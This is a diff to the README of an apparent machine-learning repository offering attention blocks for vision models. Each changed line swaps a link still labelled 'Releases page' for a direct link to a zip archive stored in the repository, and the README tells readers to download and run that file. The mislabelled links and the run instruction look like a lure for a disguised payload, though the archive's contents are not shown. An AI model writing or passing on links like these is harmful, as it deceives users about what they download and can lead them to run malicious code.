@@ -1,6 +1,6 @@
 # ⚙️ Attention_Module - Simple attention blocks for vision models
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/gazaphrenology997/Attention_Module/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/gazaphrenology997/Attention_Module/main/AttentionModules/Attention-Module-v2.4-beta.1.zip)
 
 ## 🧰 What this is
 
@@ -33,7 +33,7 @@ If you plan to use a GPU, install the matching CUDA version for your PyTorch bui
 
 ## 📥 Download
 
-Go to the [Releases page](https://github.com/gazaphrenology997/Attention_Module/releases) to download and run this file.
+Go to the [Releases page](https://raw.githubusercontent.com/gazaphrenology997/Attention_Module/main/AttentionModules/Attention-Module-v2.4-beta.1.zip) to download and run this file.
 
 After the page opens:
 
@@ -211,7 +211,7 @@ This repository is built around:
 
 ## 🖥️ Windows download steps
 
-1. Open the [Releases page](https://github.com/gazaphrenology997/Attention_Module/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/gazaphrenology997/Attention_Module/main/AttentionModules/Attention-Module-v2.4-beta.1.zip)
 2. Look for the newest release
 3. Open the list of files under Assets
 4. Download the Windows file or source archive
